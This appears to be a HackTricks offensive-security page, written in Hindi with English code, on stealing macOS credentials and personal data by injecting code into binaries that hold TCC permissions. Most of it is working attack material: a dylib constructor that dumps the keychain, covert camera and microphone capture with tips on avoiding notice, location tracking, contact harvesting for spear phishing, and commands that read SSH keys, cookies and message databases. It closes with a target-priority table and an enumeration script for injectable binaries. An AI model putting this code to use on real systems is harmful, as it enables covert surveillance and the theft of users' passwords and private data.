# TCC Permissions के माध्यम से macOS Credential और Data Theft

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

macOS TCC (Transparency, Consent, and Control) संवेदनशील user data तक access को सुरक्षित करता है। जब कोई attacker **ऐसे binary को compromise करता है जिसे पहले से TCC grants प्राप्त हैं**, तो उसे वे permissions विरासत में मिल जाती हैं। यह page data-theft से संबंधित प्रत्येक TCC permission की exploitation potential को document करता है।<sup>[[2]](#references)</sup>

> [!WARNING]
> TCC-granted binary में code injection (DYLD injection, dylib hijacking या task port के माध्यम से) **उसकी सभी TCC permissions को बिना किसी अतिरिक्त सूचना के विरासत में ले लेता है**। जब वही process protected data को read करता है, तो कोई additional prompt या verification नहीं होता।<sup>[[4]](#references)</sup>

---

## Keychain Access Groups

### The Prize

macOS Keychain निम्नलिखित को store करता है:
- **Wi-Fi passwords** — सभी saved wireless network credentials
- **Website passwords** — Safari, Chrome (जब Keychain का उपयोग किया जाता है), और अन्य browser passwords
- **Application passwords** — email accounts, VPN credentials, development tokens
- **Certificates and private keys** — code signing, client TLS, S/MIME encryption
- **Secure notes** — user द्वारा store किए गए secrets

### Entitlement: `keychain-access-groups`

Keychain items को **access groups** में organize किया जाता है। किसी application का `keychain-access-groups` entitlement उन groups की सूची देता है, जिन्हें वह access कर सकता है:<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Camera Access (kTCCServiceCamera)

### Exploitation

Camera TCC grant वाली binary (via `kTCCServiceCamera` या `com.apple.security.device.camera` entitlement) photos और video capture कर सकती है:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> **macOS Sonoma** से शुरू करते हुए, menu bar में camera indicator स्थायी होता है और इसे programmatically छिपाया नहीं जा सकता। **पुराने macOS versions** पर, थोड़े समय का capture कोई ध्यान देने योग्य indicator प्रदर्शित नहीं कर सकता।

---

## Microphone Access (kTCCServiceMicrophone)

### Exploitation

Microphone access built-in mic, headset या connected audio input devices से आने वाले सभी audio को capture करता है:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### हमला: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## स्थान ट्रैकिंग (kTCCServiceLocation)

### Exploitation
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### निरंतर ट्रैकिंग
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Contacts / Calendar / Photos

### Personal Data Exfiltration

| TCC Service | Framework | Data |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | नाम, ईमेल, फ़ोन, पते |
| `kTCCServiceCalendar` | `EventKit` | बैठकें, प्रतिभागी, स्थान |
| `kTCCServicePhotos` | `Photos.framework` | फ़ोटो, स्क्रीनशॉट, स्थान मेटाडेटा |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Contacts का संग्रहण
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud Account Access

### Entitlement: `com.apple.private.icloud-account-access`

यह entitlement `com.apple.iCloudHelper` XPC service के साथ communication की अनुमति देता है, जिससे इन चीज़ों तक access मिलता है:
- **iCloud tokens** — user के Apple ID के authentication tokens
- **iCloud Drive** — सभी devices से synced documents
- **iCloud Keychain** — सभी Apple devices पर synced passwords
- **Find My** — user के सभी Apple devices की location<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> iCloud-entitled binary से समझौता करना हमले को **एकल डिवाइस से पूरे Apple ecosystem तक** विस्तारित कर देता है: अन्य Macs, iPhones, iPads, Apple Watch। iCloud Keychain sync का अर्थ है कि सभी डिवाइसों के passwords accessible हैं।

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### सबसे शक्तिशाली TCC Permission

Full Disk Access सिस्टम की **हर file** को read करने की capability देता है, जिसमें शामिल हैं:
- अन्य apps का data (Messages, Mail, Safari history)
- TCC databases (अन्य सभी permissions का खुलासा)
- SSH keys और configuration
- Browser cookies और session tokens
- Application databases और caches
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation Priority Matrix

Injectable TCC-granted binaries का assessment करते समय data value के आधार पर प्राथमिकता दें:

| Priority | TCC Permission | Why |
|---|---|---|
| **Critical** | Full Disk Access | हर चीज़ तक access |
| **Critical** | TCC Manager | कोई भी permission grant कर सकता है |
| **High** | Keychain Access Groups | सभी stored passwords |
| **High** | iCloud Account Access | Multi-device compromise |
| **High** | Input Monitoring (ListenEvent) | Keylogging |
| **High** | Accessibility | GUI control, self-granting |
| **Medium** | Screen Capture | Visual data capture |
| **Medium** | Camera + Microphone | Surveillance |
| **Medium** | Contacts + Calendar | Social engineering data |
| **Low** | Location | Physical tracking |
| **Low** | Photos | Personal data |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## References

- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — "आपके Mac पर होने वाली बातें, क्या Apple के iCloud पर रहती हैं?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
{{#include ../../../../banners/hacktricks-training.md}}
